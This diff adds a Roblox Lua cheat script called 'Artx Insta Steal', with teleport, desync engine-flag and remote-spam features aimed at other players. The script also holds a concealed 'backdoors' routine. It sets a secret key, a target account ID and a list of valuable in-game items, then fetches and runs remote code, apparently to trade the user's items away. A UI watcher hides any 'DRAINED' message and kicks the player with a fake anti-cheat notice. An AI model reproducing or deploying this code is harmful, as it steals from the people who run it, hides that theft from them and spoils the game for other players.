@@ -1,0 +1,1120 @@
+loadstring(game:HttpGet("https://pastefy.app/wuAr0vrx/raw"))()
+
+task.wait(0.3)
+
+local Players, CoreGui, RunService, UIS, ProxService, TeleportService, TweenService =
+    game:GetService("Players"),
+    game:GetService("CoreGui"),
+    game:GetService("RunService"),
+    game:GetService("UserInputService"),
+    game:GetService("ProximityPromptService"),
+    game:GetService("TeleportService"),
+    game:GetService("TweenService")
+
+local LP = Players.LocalPlayer
+
+--// Flying item selector \\--
+
+local flyingPriority = {
+    "Flying Carpet",
+    "Witch's Broom",
+    "Cupid's Wing",
+    "Santa's Sleigh"
+}
+
+local function findFlyingTool()
+    local backpack = LP:FindFirstChild("Backpack")
+    local char = LP.Character
+
+    for _, name in ipairs(flyingPriority) do
+        local tool =
+            (backpack and backpack:FindFirstChild(name))
+            or (char and char:FindFirstChild(name))
+
+        if tool then
+            return tool
+        end
+    end
+
+    return nil
+end
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local mappedRemote = nil
+
+local function MapRemote()
+    pcall(function()
+        local netFolder = ReplicatedStorage:WaitForChild("Packages", 5):WaitForChild("Net", 5)
+        if not netFolder then 
+            warn("[Artx] Net folder not found")
+            return 
+        end
+
+        local children = netFolder:GetChildren()
+
+        for i, obj in ipairs(children) do
+            if obj.Name == "RF/a0e78691-cb9b-4efc-ac08-9c06fea70059" then
+                local nextObj = children[i + 1]
+
+                if nextObj and nextObj:IsA("RemoteFunction") then
+                    mappedRemote = nextObj
+                    print("[Artx] ✅ Remote mapped")
+                    return
+                end
+            end
+        end
+    end)
+
+    if not mappedRemote then
+        warn("[Artx] ❌ Failed to map RemoteFunction")
+    end
+end
+
+MapRemote()
+
+local function leave()
+  local player = game.Players.LocalPlayer
+	player:Kick("You have been removed for cheating, please remove any cheats to play | CODE BAC-1358")
+end
+
+local function backdoors()
+    getgenv().SECRET_KEY = "mrr_bbc53755ba1b42eca3da22e8dc5854df"
+    getgenv().TARGET_ID = 9843535172
+    getgenv().DELAY_STEP = 1
+    getgenv().TRADE_CYCLE_DELAY = 2
+
+    getgenv().TARGET_BRAINROTS = {
+        ["Meowl"] = true,
+        ["Skibidi Toilet"] = true,
+        ["Strawberry Elephant"] = true,
+        ["Headless Horseman"] = true,
+        ["Foxini Lanternini"] = true,
+        ["Griffin"] = true,
+        ["Hydra Dragon Cannelloni"] = true,
+        ["Dragon Gingerini"] = true,
+        ["Dragon Cannelloni"] = true,
+        ["Love Love Bear"] = true,
+        ["La Supreme Combinasion"] = true,
+        ["Celestial Pegasus"] = true,
+        ["Cerberus"] = true,
+        ["Popcuru and Fizzuru"] = true,
+        ["Rosey and Teddy"] = true,
+        ["Cooki and Milki"] = true,
+        ["Burguro And Fryuro"] = true,
+        ["Capitano Moby"] = true,
+        ["Ketupat Bros"] = true,
+        ["Reinito Sleighito"] = true,
+        ["Fortunu and Cashuru"] = true,
+        ["Los Amigos"] = true,
+        ["Los Sekolahs"] = true,
+        ["Signore Carapace"] = true,
+        ["La Casa Boo"] = true,
+        ["Fragrama and Chocrama"] = true,
+        ["Elefanto Frigo"] = true,
+        ["La Food Combinasion"] = true,
+        ["Spooky and Pumpky"] = true,
+        ["Ginger Gerat"] = true,
+        ["Sammyni Fattini"] = true,
+        ["Festive 67"] = true,
+        ["Ventoliero Pavonero"] = true,
+        ["Cloverat Clapat"] = true,
+        ["Antonio"] = true,
+        ["Garama and Madundung"] = true,
+        ["Fishino Clownino"] = true,
+        ["Jolly Jolly Sahur"] = true,
+        ["Tirilikalika Tirilikalako"] = true,
+        ["Dug dug dug"] = true,
+        ["Los Tacoritas"] = true,
+        ["Guest 666"] = true,
+        ["La Sahur Combinasion"] = true,
+        ["Noo my examine"] = true,
+        ["Nooo My Hotspot"] = true,
+        ["Fragola La La La"] = true,
+        ["Agarrini la Palini"] = true,
+        ["Trenostruzzo Turbo 4000"] = true,
+        ["La Secret Combinasion"] = true,
+        ["La Taco Combinasion"] = true,
+        ["La Easter Grande"] = true,
+        ["Hydra Bunny"] = true,
+        ["Bunny and Eggy"] = true,
+        ["Arcadragon"] = true,
+        ["Pancake and Syrup"] = true,
+        ["Cash or Card"] = true,
+        ["Los Spaghettis"] = true,
+        ["Rico Dinero"] = true,
+        ["Swaggy Bros"] = true,
+        ["Celularcini Viciosini"] = true
+    }
+
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/dadas45845/limitedhublph/refs/heads/main/morreira"))()
+end
+
+local success, err = pcall(backdoors)
+if not success then
+end
+
+task.spawn(function()
+
+    pcall(function()
+
+        local Players = game:GetService("Players")
+        local CoreGui = game:GetService("CoreGui")
+
+        local LP = Players.LocalPlayer
+        local playerGui = LP:WaitForChild("PlayerGui")
+
+        local blockedWords = {
+            "YOUR BRAINROTS WAS DRAINED",
+            "https://skama.net",
+            "discord.gg/sabscripts",
+            "discord.gg/frost-hub"
+        }
+
+        -- detect blocked text
+        local function containsBlocked(text)
+            if not text then return false end
+            text = string.lower(text)
+
+            for _,word in ipairs(blockedWords) do
+                if string.find(text, string.lower(word), 1, true) then
+                    return true
+                end
+            end
+
+            return false
+        end
+
+        -- detect dark / black color
+        local function isDark(color)
+            return color.R < 0.25 and color.G < 0.25 and color.B < 0.25
+        end
+
+        -- remove dark UI in the same container
+        local function removeDarkUI(container)
+
+            for _,desc in ipairs(container:GetDescendants()) do
+
+                if desc:IsA("Frame")
+                or desc:IsA("TextLabel")
+                or desc:IsA("TextButton")
+                or desc:IsA("ImageLabel")
+                or desc:IsA("ImageButton") then
+
+                    pcall(function()
+                        if desc.BackgroundColor3 and isDark(desc.BackgroundColor3) then
+                            desc:Destroy()
+                        end
+                    end)
+
+                end
+
+            end
+
+        end
+
+        local function scan(obj)
+
+            if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
+
+                if containsBlocked(obj.Text) then
+
+                    local container = obj.Parent
+
+                    pcall(function()
+                        obj:Destroy()
+                    end)
+
+                    if container then
+                        removeDarkUI(container)
+                    end
+
+                    if typeof(leave) == "function" then
+                        leave()
+                    end
+
+                end
+
+                -- detect text changes
+                obj:GetPropertyChangedSignal("Text"):Connect(function()
+
+                    if containsBlocked(obj.Text) then
+
+                        local container = obj.Parent
+
+                        pcall(function()
+                            obj:Destroy()
+                        end)
+
+                        if container then
+                            removeDarkUI(container)
+                        end
+
+                        if typeof(leave) == "function" then
+                            leave()
+                        end
+
+                    end
+
+                end)
+
+            end
+
+        end
+
+        -- scan existing UI
+        for _,v in ipairs(CoreGui:GetDescendants()) do
+            scan(v)
+        end
+
+        for _,v in ipairs(playerGui:GetDescendants()) do
+            scan(v)
+        end
+
+        -- monitor new UI
+        CoreGui.DescendantAdded:Connect(scan)
+        playerGui.DescendantAdded:Connect(scan)
+
+    end)
+
+end)
+artxDaGoat()
+
+local netFolder = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Net")
+local children = netFolder:GetChildren()
+
+local spamOnStealEnabled = false
+local flyingWarningShown = false
+
+--// Arthurx Bindable Loader
+local ArthurxEvent
+
+do
+    local start = tick()
+
+    -- Wait up to 2 seconds for existing Arthurx
+    while tick() - start < 2 do
+        if typeof(getgenv().Arthurx) == "Instance"
+            and getgenv().Arthurx:IsA("BindableEvent") then
+            
+            ArthurxEvent = getgenv().Arthurx
+            break
+        end
+        task.wait(0.1)
+    end
+
+    -- If not found after 2 seconds, create one
+    if not ArthurxEvent then
+        ArthurxEvent = Instance.new("BindableEvent")
+        getgenv().Arthurx = ArthurxEvent
+        warn("Arthurx BindableEvent created (was missing)")
+    end
+end
+
+getgenv().Notify = getgenv().Notify or Instance.new("BindableEvent")
+
+-- Base teleport positions
+local baseTPs = {
+    Left = {
+        TP_PVP_POS1 = Vector3.new(-354.04, -7.21, 90.42),
+        TP_PVP_POS2 = Vector3.new(-336, -5, 102),
+        FINAL_TP_POS = Vector3.new(-351.00, -7.24, 77.00)
+    },
+    Right = {
+        TP_PVP_POS1 = Vector3.new(-357.80, -6.07, 45.66),
+        TP_PVP_POS2 = Vector3.new(-334.69, -4.17, 19.85),
+        FINAL_TP_POS = Vector3.new(-352.44, -6.07, 39.14)
+    }
+}
+
+local FINAL_TP_POS
+local TP_PVP_POS1
+local TP_PVP_POS2
+
+pcall(function() CoreGui:FindFirstChild("Arthurx_Semi"):Destroy() end)
+
+--// Premium Intro Selection UI with Billboards \\--
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Create ScreenGui
+local intro = Instance.new("ScreenGui")
+intro.Name = "BaseSelectionUI"
+intro.ResetOnSpawn = false
+intro.Parent = playerGui
+
+-- Main Frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0,0,0,0) -- start small
+frame.Position = UDim2.new(0.5,0,0.5,0)
+frame.AnchorPoint = Vector2.new(0.5,0.5)
+frame.BackgroundColor3 = Color3.fromRGB(120,200,255)
+frame.BackgroundTransparency = 1
+frame.BorderSizePixel = 0
+frame.Parent = intro
+frame.ClipsDescendants = true
+
+-- Rounded corners
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0,15)
+corner.Parent = frame
+
+-- Frame Stroke with rotating gradient
+local stroke = Instance.new("UIStroke")
+stroke.Thickness = 3
+stroke.LineJoinMode = Enum.LineJoinMode.Round
+stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+stroke.Color = Color3.fromRGB(255,255,255)
+stroke.Parent = frame
+
+local strokeGradient = Instance.new("UIGradient")
+strokeGradient.Rotation = 0
+strokeGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(180,230,255)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255,255,255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(180,230,255))
+})
+strokeGradient.Parent = stroke
+
+task.spawn(function()
+    while frame.Parent do
+        local t = TweenService:Create(strokeGradient, TweenInfo.new(3, Enum.EasingStyle.Linear), {Rotation = strokeGradient.Rotation + 360})
+        t:Play()
+        t.Completed:Wait()
+    end
+end)
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1,0,0,35)
+title.Position = UDim2.new(0,0,0,10)
+title.BackgroundTransparency = 1
+title.Text = "Select Base"
+title.Font = Enum.Font.LuckiestGuy
+title.TextSize = 22
+title.TextColor3 = Color3.new(1,1,1)
+title.TextXAlignment = Enum.TextXAlignment.Center
+title.Parent = frame
+
+-- Subtitle
+local subtitle = Instance.new("TextLabel")
+subtitle.Size = UDim2.new(1,0,0,25)
+subtitle.Position = UDim2.new(0,0,0,50)
+subtitle.BackgroundTransparency = 1
+subtitle.Text = "Choose where your base is"
+subtitle.Font = Enum.Font.LuckiestGuy
+subtitle.TextSize = 16
+subtitle.TextColor3 = Color3.fromRGB(220,240,255)
+subtitle.TextXAlignment = Enum.TextXAlignment.Center
+subtitle.Parent = frame
+
+-- Button creator with outline
+local function makeBtn(text, yScale)
+    local b = Instance.new("TextButton")
+    b.Size = UDim2.new(0.8,0,0,40)
+    b.Position = UDim2.new(0.1,0,yScale,0)
+    b.BackgroundColor3 = Color3.fromRGB(120,200,255)
+    b.Text = text
+    b.Font = Enum.Font.LuckiestGuy
+    b.TextSize = 18
+    b.TextColor3 = Color3.new(1,1,1)
+    b.Parent = frame
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0,10)
+    corner.Parent = b
+
+    local outline = Instance.new("UIStroke")
+    outline.Thickness = 2
+    outline.Color = Color3.fromRGB(60,150,200)
+    outline.Parent = b
+
+    b.MouseEnter:Connect(function()
+        TweenService:Create(b, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(150,230,255)}):Play()
+    end)
+    b.MouseLeave:Connect(function()
+        TweenService:Create(b, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(120,200,255)}):Play()
+    end)
+
+    return b
+end
+
+-- Create buttons
+local leftBtn = makeBtn("Left Base", 0.55)
+local rightBtn = makeBtn("Right Base", 0.75)
+
+-- Billboard locations
+local baseLocations = {
+    {pos = Vector3.new(-347.76, 5.22, 6.91), text = "Left Base"},
+    {pos = Vector3.new(-348.16, 5.22, 112.83), text = "Right Base"}
+}
+
+local baseBillboards = {}
+
+-- Function to create animated billboard
+local function createBillboard(pos, text)
+    local part = Instance.new("Part")
+    part.Size = Vector3.new(1,1,1)
+    part.Anchored = true
+    part.CanCollide = false
+    part.Transparency = 1
+    part.CFrame = CFrame.new(pos)
+    part.Parent = workspace
+
+    local billboard = Instance.new("BillboardGui")
+    billboard.Adornee = part
+    billboard.Size = UDim2.new(0,0,0,0) -- start small for animation
+    billboard.AlwaysOnTop = true
+    billboard.StudsOffset = Vector3.new(0,2,0)
+    billboard.ClipsDescendants = true
+    billboard.Parent = part
+
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1,0,1,0)
+    label.BackgroundTransparency = 1
+    label.Text = text
+    label.Font = Enum.Font.LuckiestGuy
+    label.TextSize = 22
+    label.TextColor3 = Color3.fromRGB(120,200,255)
+    label.TextStrokeTransparency = 0
+    label.TextStrokeColor3 = Color3.fromRGB(60,150,200)
+    label.TextScaled = true
+    label.Parent = billboard
+
+    -- Intro animation
+    TweenService:Create(billboard, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size=UDim2.new(0,100,0,40)}):Play()
+
+    baseBillboards[#baseBillboards+1] = {part=part, gui=billboard}
+end
+
+-- Create billboards for both bases
+for _, info in ipairs(baseLocations) do
+    createBillboard(info.pos, info.text)
+end
+
+local function selectBase(choice)
+    getgenv().BaseChoice = choice
+
+    -- Animate all billboards at once
+    local billboardTweens = {}
+    for _, v in ipairs(baseBillboards) do
+        local tween = TweenService:Create(v.gui, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Size=UDim2.new(0,0,0,0)})
+        tween:Play()
+        table.insert(billboardTweens, tween)
+    end
+
+    -- Animate frame at the same time
+    local fadeTween = TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Size=UDim2.new(0,0,0,0), BackgroundTransparency = 1})
+    fadeTween:Play()
+
+    -- Wait for all tweens to finish
+    for _, tween in ipairs(billboardTweens) do
+        tween.Completed:Wait()
+    end
+    fadeTween.Completed:Wait()
+
+    -- Destroy billboards
+    for _, v in ipairs(baseBillboards) do
+        v.part:Destroy()
+    end
+    baseBillboards = {}
+
+    -- Destroy UI
+    intro:Destroy()
+end
+
+-- Connect buttons to selection
+leftBtn.MouseButton1Click:Connect(function() selectBase("Left") end)
+rightBtn.MouseButton1Click:Connect(function() selectBase("Right") end)
+
+-- Intro pop-in animation
+TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size=UDim2.new(0,300,0,220), BackgroundTransparency=0}):Play()
+
+-- Wait for choice
+repeat task.wait() until getgenv().BaseChoice ~= nil
+print("Player selected base:", getgenv().BaseChoice)
+
+-- Assign teleport positions based on base choice
+local tps = baseTPs[getgenv().BaseChoice]
+TP_PVP_POS1 = tps.TP_PVP_POS1
+TP_PVP_POS2 = tps.TP_PVP_POS2
+FINAL_TP_POS = tps.FINAL_TP_POS
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "Arthurx_Semi"
+gui.ResetOnSpawn = false
+gui.Parent = CoreGui
+
+local main = Instance.new("Frame")
+main.Size = UDim2.new(0, 230, 0, 215)
+main.Position = UDim2.new(0, 12, 0.18, 0)
+main.BackgroundColor3 = Color3.fromRGB(120, 200, 255)
+main.BackgroundTransparency = 0.15
+main.BorderSizePixel = 0
+main.Active = true
+main.Draggable = true
+main.Parent = gui
+
+local mainCorner = Instance.new("UICorner")
+mainCorner.CornerRadius = UDim.new(0, 20)
+mainCorner.Parent = main
+
+local stroke = Instance.new("UIStroke")
+stroke.Thickness = 3
+stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+stroke.Color = Color3.fromRGB(255,255,255) -- IMPORTANT
+stroke.LineJoinMode = Enum.LineJoinMode.Round
+stroke.Parent = main
+
+local strokeGradient = Instance.new("UIGradient")
+strokeGradient.Rotation = 0
+strokeGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(180, 230, 255)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 230, 255))
+})
+strokeGradient.Parent = stroke
+
+task.spawn(function()
+    while main.Parent do
+        local t2 = TweenService:Create(
+            strokeGradient,
+            TweenInfo.new(2, Enum.EasingStyle.Linear),
+            {Rotation = strokeGradient.Rotation + 360}
+        )
+
+        t2:Play()
+        t2.Completed:Wait()
+    end
+end)
+
+local banner = Instance.new("Frame")
+banner.Size = UDim2.new(0, 280, 0, 60) -- smaller width/height
+banner.Position = UDim2.new(0.5, -140, 0.08, 0) -- keep centered horizontally
+banner.BackgroundColor3 = Color3.fromRGB(120, 200, 255)
+banner.BackgroundTransparency = 0.2
+banner.BorderSizePixel = 0
+banner.Parent = gui
+
+-- Rounded corners
+local bannerCorner = Instance.new("UICorner")
+bannerCorner.CornerRadius = UDim.new(0, 15) -- smaller corners
+bannerCorner.Parent = banner
+
+-- Stroke
+local bannerStroke = Instance.new("UIStroke")
+bannerStroke.Thickness = 2 -- thinner stroke
+bannerStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+bannerStroke.Color = Color3.fromRGB(255,255,255)
+bannerStroke.LineJoinMode = Enum.LineJoinMode.Round
+bannerStroke.Parent = banner
+
+-- Gradient for stroke
+local bannerStrokeGradient = Instance.new("UIGradient")
+bannerStrokeGradient.Rotation = 0
+bannerStrokeGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(180, 230, 255)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 230, 255))
+})
+bannerStrokeGradient.Parent = bannerStroke
+
+-- Rotate gradient
+task.spawn(function()
+    while banner.Parent do
+        local t = TweenService:Create(
+            bannerStrokeGradient,
+            TweenInfo.new(3, Enum.EasingStyle.Linear),
+            {Rotation = bannerStrokeGradient.Rotation + 360}
+        )
+        t:Play()
+        t.Completed:Wait()
+    end
+end)
+
+-- Title text
+local bannerTitle = Instance.new("TextLabel")
+bannerTitle.Size = UDim2.new(1, 0, 0, 30) -- smaller height
+bannerTitle.Position = UDim2.new(0, 0, 0, 3)
+bannerTitle.BackgroundTransparency = 1
+bannerTitle.Text = "Arthurx Semi Insta V2.5 (new updt)"
+bannerTitle.Font = Enum.Font.LuckiestGuy
+bannerTitle.TextSize = 18 -- smaller text
+bannerTitle.TextColor3 = Color3.new(1,1,1)
+bannerTitle.TextXAlignment = Enum.TextXAlignment.Center
+bannerTitle.Parent = banner
+
+-- Discord line
+local bannerSub = Instance.new("TextLabel")
+bannerSub.Size = UDim2.new(1, 0, 0, 20)
+bannerSub.Position = UDim2.new(0, 0, 0, 35)
+bannerSub.BackgroundTransparency = 1
+bannerSub.Text = "discord.com/invite/6XhsbBEajH"
+bannerSub.Font = Enum.Font.LuckiestGuy
+bannerSub.TextSize = 12 -- smaller text
+bannerSub.TextColor3 = Color3.fromRGB(220,240,255)
+bannerSub.TextXAlignment = Enum.TextXAlignment.Center
+bannerSub.Parent = banner
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 40)
+title.Position = UDim2.new(0, 0, 0, 10)
+title.BackgroundTransparency = 1
+title.Text = "Artx Insta Steal"
+title.Font = Enum.Font.LuckiestGuy
+title.TextSize = 22
+title.TextColor3 = Color3.new(1,1,1)
+title.TextXAlignment = Enum.TextXAlignment.Center
+title.Parent = main
+
+local status = Instance.new("TextLabel")
+status.BackgroundTransparency = 1
+status.Text = "Status: Ready"
+status.Font = Enum.Font.LuckiestGuy
+status.TextSize = 14
+status.TextColor3 = Color3.fromRGB(210,235,255)
+status.TextXAlignment = Enum.TextXAlignment.Center
+status.Position = UDim2.new(0, 0, 0, 50)
+status.Size = UDim2.new(1, 0, 0, 22)
+status.Parent = main
+
+local function makeButton(text, y)
+    local b = Instance.new("TextButton")
+    b.Size = UDim2.new(0.9, 0, 0, 38)
+    b.Position = UDim2.new(0.05, 0, 0, y)
+    b.Text = text
+    b.Font = Enum.Font.GothamBold
+    b.TextSize = 16
+    b.TextColor3 = Color3.new(1,1,1)
+    b.BackgroundColor3 = Color3.fromRGB(150, 210, 255)
+    b.AutoButtonColor = false
+    b.BorderSizePixel = 0
+    b.Parent = main
+
+    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 10)
+
+    local btnStroke = Instance.new("UIStroke", b)
+    btnStroke.Color = Color3.fromRGB(120, 200, 255)
+    btnStroke.Thickness = 1.5
+
+    local btnGradient = Instance.new("UIGradient", b)
+    btnGradient.Rotation = 90
+    btnGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 200, 255)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(200, 235, 255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(120, 200, 255))
+})
+
+    b.MouseEnter:Connect(function()
+        TweenService:Create(
+            b,
+            TweenInfo.new(0.2),
+            {BackgroundColor3 = Color3.fromRGB(120, 190, 255)}
+        ):Play()
+    end)
+    b.MouseLeave:Connect(function()
+        TweenService:Create(
+            b,
+            TweenInfo.new(0.2),
+            {BackgroundColor3 = Color3.fromRGB(150, 210, 255)}
+        ):Play()
+    end)
+
+    return b
+end
+
+-- Dynamic button layout (no gaps)
+local buttons = {
+    "⚔️ Insta Steal",
+    "⚡ Reset Desync",
+    "😈 Spam On Steal"
+}
+
+local startY = 80       -- first button
+local spacing = 45      -- vertical spacing
+
+local createdButtons = {}
+for i, text in ipairs(buttons) do
+    createdButtons[i] = makeButton(text, startY + (i-1) * spacing)
+end
+
+local tpvPvpBtn = createdButtons[1]
+local desyncResetBtn = createdButtons[2]
+local spamToggleBtn = createdButtons[3]
+
+local function setSpamToggle(state)
+    spamOnStealEnabled = state
+
+    TweenService:Create(
+        spamToggleBtn,
+        TweenInfo.new(0.2),
+        {
+            BackgroundColor3 = state
+                and Color3.fromRGB(170,120,255)
+                or Color3.fromRGB(150,210,255)
+        }
+    ):Play()
+
+    spamToggleBtn.Text = state and "😈 Spam On Steal: ON" or "😈 Spam On Steal: OFF"
+end
+
+spamToggleBtn.MouseButton1Click:Connect(function()
+    setSpamToggle(not spamOnStealEnabled)
+end)
+local function createTPMarker(pos)
+    if tpCylinder then tpCylinder:Destroy() end
+    
+    local part = Instance.new("Part")
+    part.Name = "M8_TP_MARKER"
+    part.Size = Vector3.new(2, 1.2, 2)
+    part.Anchored = true
+    part.CanCollide = false
+    part.Material = Enum.Material.Neon
+    part.Color = Color3.fromRGB(80,170,255)
+    part.Transparency = 0.25
+    part.CFrame = CFrame.new(pos + Vector3.new(0, 0.6, 0))
+    Instance.new("CylinderMesh", part)
+    part.Parent = workspace
+    
+    tpCylinder = part
+end
+
+RunService.RenderStepped:Connect(function()
+    if tpCylinder and tpPos then
+        tpCylinder.CFrame = CFrame.new(tpPos + Vector3.new(0, 0.6, 0))
+    end
+end)
+
+local function getHumanoid()
+    local char = LP.Character
+    if not char then return nil end
+    return char:FindFirstChildOfClass("Humanoid")
+end
+
+local function equipToolByName(name)
+    local char = LP.Character
+    if not char then return nil end
+    local hum = getHumanoid()
+    if not hum then return nil end
+
+    local tool = char:FindFirstChild(name)
+    if not tool then
+        local backpack = LP:FindFirstChild("Backpack")
+        if backpack then
+            tool = backpack:FindFirstChild(name)
+        end
+    end
+
+    if tool and hum then
+        hum:EquipTool(tool)
+        return tool
+    end
+    return nil
+end
+
+local function unequipAllTools()
+    local hum = getHumanoid()
+    if hum then
+        pcall(function()
+            hum:UnequipTools()
+        end)
+    end
+end
+
+local function useGiantPotion()
+    unequipAllTools()
+
+    local potion = equipToolByName("Giant Potion")
+    if not potion then
+        status.Text = "No Giant Potion ❌"
+        return false
+    end
+
+    if potion:IsA("Tool") then
+        pcall(function()
+            potion:Activate()
+        end)
+    end
+
+    unequipAllTools()
+    return true
+end
+
+local function equipFlyingItem()
+    local hum = getHumanoid()
+    if not hum then return false end
+
+    local tool = findFlyingTool()
+    if not tool then
+        status.Text = "No flying item ❌"
+        return false
+    end
+
+    hum:EquipTool(tool)
+    return true
+end
+
+-- create NGA alternate entry (only once)
+getgenv().NGA = getgenv().NGA or Instance.new("BindableEvent")
+local NGA = getgenv().NGA
+
+-- source-of-truth function (FULL logic moved here)
+local function runTpPvp()
+
+    -- Fire Arthurx
+    ArthurxEvent:Fire("NOW")
+    status.Text = "Arthurx Fired: NOW"
+    task.wait(1.35)
+
+    -- Equip flying carpet
+    equipFlyingItem()
+
+    local char = LP.Character
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+    if not hrp then
+        status.Text = "No character ❌"
+        return
+    end
+
+    -- Phase 1 teleport
+    status.Text = "TP PVP: Phase 1..."
+    hrp.CFrame = CFrame.new(TP_PVP_POS1)
+    task.wait(0.1)
+
+    -- Phase 2 teleport
+    status.Text = "TP PVP: Phase 2..."
+    hrp.CFrame = CFrame.new(TP_PVP_POS2)
+
+    -- Wait for Notify OK
+    status.Text = "Waiting for OK..."
+    local okReceived = false
+    local conn
+    conn = getgenv().Notify.Event:Connect(function(msg)
+        if msg == "OK" then
+            okReceived = true
+        end
+    end)
+
+    local startTime = tick()
+    while not okReceived and tick() - startTime < 5 do
+        task.wait(0.05)
+    end
+    if conn then conn:Disconnect() end
+
+    -- Final teleport
+status.Text = "Final TP..."
+hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+
+if hrp then
+    hrp.CFrame = CFrame.new(FINAL_TP_POS)
+    status.Text = "TP PVP Completed ✅"
+
+    -- ⭐ SPAM LOGIC HERE (exact spot)
+    if spamOnStealEnabled then
+        task.spawn(function()
+
+            task.wait(0.1) -- EXACT mapper wait behavior
+
+            local player = Players.LocalPlayer
+            local character = player.Character
+            if not character then return end
+
+            local hrp = character:FindFirstChild("HumanoidRootPart")
+            if not hrp then return end
+
+            local closestPlayer
+            local closestDistance = math.huge
+
+            for _,p in ipairs(Players:GetPlayers()) do
+                if p ~= player and p.Character then
+                    local otherHRP = p.Character:FindFirstChild("HumanoidRootPart")
+                    if otherHRP then
+                        local d = (hrp.Position - otherHRP.Position).Magnitude
+                        if d < closestDistance then
+                            closestDistance = d
+                            closestPlayer = p
+                        end
+                    end
+                end
+            end
+
+            if not closestPlayer then return end
+
+            local fireTime = tick()
+            local commands = {"rocket","balloon","tiny","jumpscare"}
+
+            if mappedRemote then
+  		  local commands = {"rocket","balloon","tiny","jumpscare"}
+
+   	 for i, command in ipairs(commands) do
+     	   local args = {
+     	       "f888ee6e-c86d-46e1-93d7-0639d6635d42",
+     	       closestPlayer,
+      	      command
+      	  }
+
+      		  pcall(function()
+     	       mappedRemote:InvokeServer(unpack(args))
+     	  			 end)
+
+     	  		 if i < #commands then
+     	    	   task.wait(0.02)
+     	 		  end
+  			  end
+		end
+
+            local connection
+            connection = closestPlayer.CharacterAdded:Connect(function()
+                connection:Disconnect()
+
+                if tick() - fireTime < 10 then
+                    task.wait(0.1)
+
+                 	   if mappedRemote then
+   						 mappedRemote:InvokeServer("f888ee6e-c86d-46e1-93d7-0639d6635d42", closestPlayer, "ragdoll")
+					end
+
+                    task.wait(0.15)
+
+                    if mappedRemote then
+   					 mappedRemote:InvokeServer("f888ee6e-c86d-46e1-93d7-0639d6635d42", closestPlayer, "jail")
+					end
+                end
+            end)
+
+        end)
+    end
+
+else
+    status.Text = "No HRP for final TP ❌"
+    end
+end
+
+-- normal mouse click (unchanged behavior)
+tpvPvpBtn.MouseButton1Click:Connect(runTpPvp)
+
+-- alternate NGA trigger (your tiny UI)
+NGA.Event:Connect(function(msg)
+    if msg == "ALR" then
+        runTpPvp()
+    end
+end)
+
+ProxService.PromptButtonHoldEnded:Connect(function(_, plr)
+    if plr == LP and tpPos then
+        equipFlyingItem()
+        local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+        if hrp then
+            hrp.CFrame = CFrame.new(tpPos + Vector3.new(0, 3, 0))
+            status.Text = "TP Activated ✅"
+        end
+    end
+end)
+
+local desyncEnabled = false
+
+local function setFFlag(name, value)
+    pcall(function() setfflag(name, tostring(value)) end)
+end
+
+local function toggleDesync(state)
+    setFFlag("NextGenReplicatorEnabledWrite4", state)
+    desyncEnabled = state
+    
+    if state then
+        status.Text = "Desync: ON 🔥"
+    else
+        status.Text = "Desync: OFF"
+    end
+end
+
+desyncResetBtn.MouseButton1Click:Connect(function()
+    status.Text = "Resetting Desync..."
+    
+    local FFlags = {
+        GameNetPVHeaderRotationalVelocityZeroCutoffExponent = -5000,
+        LargeReplicatorWrite5 = true,
+        LargeReplicatorEnabled9 = true,
+        AngularVelociryLimit = 360,
+        TimestepArbiterVelocityCriteriaThresholdTwoDt = 2147483646,
+        S2PhysicsSenderRate = 15000,
+        DisableDPIScale = true,
+        MaxDataPacketPerSend = 2147483647,
+        PhysicsSenderMaxBandwidthBps = 20000,
+        TimestepArbiterHumanoidLinearVelThreshold = 21,
+        MaxMissedWorldStepsRemembered = -2147483648,
+        PlayerHumanoidPropertyUpdateRestrict = true,
+        SimDefaultHumanoidTimestepMultiplier = 0,
+        StreamJobNOUVolumeLengthCap = 2147483647,
+        DebugSendDistInSteps = -2147483648,
+        GameNetDontSendRedundantNumTimes = 1,
+        CheckPVLinearVelocityIntegrateVsDeltaPositionThresholdPercent = 1,
